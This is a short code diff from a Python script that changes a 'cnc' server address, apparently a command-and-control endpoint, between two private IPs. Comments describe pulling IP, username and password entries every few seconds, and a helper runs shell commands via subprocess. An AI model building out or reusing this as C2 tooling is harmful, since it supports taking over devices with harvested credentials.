@@ -17,7 +17,7 @@ logger=logging.getLogger()
 logger.setLevel(logging.DEBUG) 
 #run this script every 10 seconds or so
 #get ip user password that are not loaded yet from db, currently from file
-cnc = "http://192.168.29.74:5000"
+cnc = "http://192.168.1.18:5000"
 
 def execute(cmd):
     popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
